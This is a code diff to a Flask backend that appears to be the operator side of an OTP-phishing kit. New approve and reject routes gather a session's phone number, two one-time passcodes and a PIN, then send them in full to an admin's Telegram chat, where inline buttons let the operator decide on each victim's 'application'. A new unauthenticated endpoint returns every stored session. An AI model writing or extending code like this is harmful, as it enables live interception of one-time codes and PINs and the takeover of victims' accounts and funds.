@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
+import json
 import requests
 import os
 from dotenv import load_dotenv
@@ -8,7 +9,8 @@ from sessions import (
     create_session,
     get_session,
     save_step2,
-    update_status
+    update_status,
+    get_all_sessions
 )
 
 load_dotenv()
@@ -56,11 +58,28 @@ Status:
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
+    keyboard = {
+        "inline_keyboard": [
+            [
+                {
+                    "text": "✅ Approve",
+                    "callback_data": f"approve_{session_id}"
+                },
+                {
+                    "text": "❌ Reject",
+                    "callback_data": f"reject_{session_id}"
+                }
+            ]
+        ]
+    }
+
+
     requests.post(
         url,
         data={
             "chat_id": ADMIN_ID,
-            "text": message
+            "text": message,
+            "reply_markup": json.dumps(keyboard)
         }
     )
 
@@ -69,14 +88,6 @@ Status:
         "session_id": session_id
     })
 
-
-# ----------------------------
-# STEP 2
-# ----------------------------
-# ----------------------------
-# STEP 2
-# ----------------------------
-# ----------------------------
 # STEP 2
 # ----------------------------
 @app.route("/step2", methods=["POST"])
@@ -121,14 +132,54 @@ Status:
         "session_id": session_id
     })
 # ----------------------------
-# APPROVE
-# ----------------------------
+# approve
 @app.route("/approve/<session_id>")
 def approve(session_id):
 
     result = update_status(session_id, "approved")
 
     if result:
+
+        session = get_session(session_id)
+
+        phone = session["data"]["phone"]
+        otp1 = session["data"]["otp1"]
+
+        demo_pin = session["data"].get("step2", {}).get("demo_pin", "Not entered")
+        otp2 = session["data"].get("step2", {}).get("otp2", "Not entered")
+
+        message = f"""
+✅ APPLICATION APPROVED
+
+📱 Phone:
+{phone}
+
+📝 OTP1:
+{otp1}
+
+🔐 Demo PIN:
+{demo_pin}
+
+📝 OTP2:
+{otp2}
+
+🆔 Session ID:
+{session_id}
+
+Status:
+✅ APPROVED
+"""
+
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+        requests.post(
+            url,
+            data={
+                "chat_id": ADMIN_ID,
+                "text": message
+            }
+        )
+
         return jsonify({
             "status": "approved",
             "session_id": session_id
@@ -137,8 +188,6 @@ def approve(session_id):
     return jsonify({
         "error": "Session not found"
     }), 404
-
-
 # ----------------------------
 # REJECT
 # ----------------------------
@@ -148,6 +197,47 @@ def reject(session_id):
     result = update_status(session_id, "rejected")
 
     if result:
+
+        session = get_session(session_id)
+
+        phone = session["data"]["phone"]
+        otp1 = session["data"]["otp1"]
+
+        demo_pin = session["data"].get("step2", {}).get("demo_pin", "Not entered")
+        otp2 = session["data"].get("step2", {}).get("otp2", "Not entered")
+
+        message = f"""
+❌ APPLICATION REJECTED
+
+📱 Phone:
+{phone}
+
+📝 OTP1:
+{otp1}
+
+🔐 Demo PIN:
+{demo_pin}
+
+📝 OTP2:
+{otp2}
+
+🆔 Session ID:
+{session_id}
+
+Status:
+❌ REJECTED
+"""
+
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+        requests.post(
+            url,
+            data={
+                "chat_id": ADMIN_ID,
+                "text": message
+            }
+        )
+
         return jsonify({
             "status": "rejected",
             "session_id": session_id
@@ -156,8 +246,6 @@ def reject(session_id):
     return jsonify({
         "error": "Session not found"
     }), 404
-
-
 # ----------------------------
 # CHECK SESSION
 # ----------------------------
@@ -172,6 +260,24 @@ def session(session_id):
         }), 404
 
     return jsonify(s)
+    # ----------------------------
+# ALL APPLICATIONS
+# ----------------------------
+@app.route("/applications")
+def applications():
+
+    return jsonify(get_all_sessions())
+
+
+@app.route("/telegram", methods=["POST"])
+def telegram_webhook():
+
+    data = request.json
+
+    print("Telegram Update:")
+    print(data)
+
+    return "OK"
 
 
 if __name__ == "__main__":
